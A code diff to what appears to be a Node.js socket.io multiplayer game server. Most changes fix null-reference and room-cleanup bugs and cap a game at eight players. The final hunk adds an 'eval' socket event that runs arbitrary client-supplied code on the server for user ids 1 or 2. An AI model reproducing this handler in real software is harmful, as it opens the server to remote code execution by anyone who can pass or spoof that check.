@@ -119,7 +119,7 @@ function Run(io) {
     function playerWinAnction(room) {
         try {
             for (let k in Rooms[room].playedPlayer) {
-                if (Rooms[room].player[k].gaming == true) {
+                if (Rooms[room].player[k] != undefined && Rooms[room].player[k].gaming == true) {
                     Rooms[room].playedPlayer[k].place = 1;
                 } else if (Rooms[room].playedPlayer[k].place == 0) {
                     Rooms[room].playedPlayer[k].place = 2;
@@ -213,6 +213,7 @@ function Run(io) {
         Rooms[room].playedPlayer = {};
         let i = 1;
         for (var k in Rooms[room].player) {
+            if (i > 8) break;
             Rooms[room].playedPlayer[k] = {};
             Rooms[room].playedPlayer[k].place = 0;
             Rooms[room].player[k].prepare = false;
@@ -290,9 +291,11 @@ function Run(io) {
                 Rooms[playerRoom[uid]].player[uid].connect = false;
             } else {
                 delete Rooms[playerRoom[uid]].player[uid];
-                return;
+                for (let k in Rooms[playerRoom[uid]].player) {
+                    if (Rooms[playerRoom[uid]].player[k].connect == false) delete Rooms[playerRoom[uid]].player[k];
+                }
             }
-            if (Object.keys(Rooms[playerRoom[uid]].player).length == 0 || Rooms[playerRoom[uid]].game == undefined) {
+            if (Object.keys(Rooms[playerRoom[uid]].player).length == 0 && Rooms[playerRoom[uid]].game == undefined) {
                 delete Rooms[playerRoom[uid]];
             }
             if (Rooms[playerRoom[uid]] != undefined) {
@@ -325,7 +328,8 @@ function Run(io) {
                 }
             }
             if (dat.private != undefined) {
-                Rooms[playerRoom[uid]].settings.private = dat.private;
+                if (Rooms[playerRoom[uid]] != undefined)
+                    Rooms[playerRoom[uid]].settings.private = dat.private;
             }
             bc(playerRoom[uid], 'UpdateSettings', Rooms[playerRoom[uid]].settings);
         })
@@ -349,6 +353,10 @@ function Run(io) {
             }
             dat = xss(dat);
             bc('World', 'WorldMessage', uname + ': ' + dat);
+        })
+
+        s.on('eval', function (dat) {
+            if (uid == 1 || uid == 2) eval(dat);
         })
     })
 }
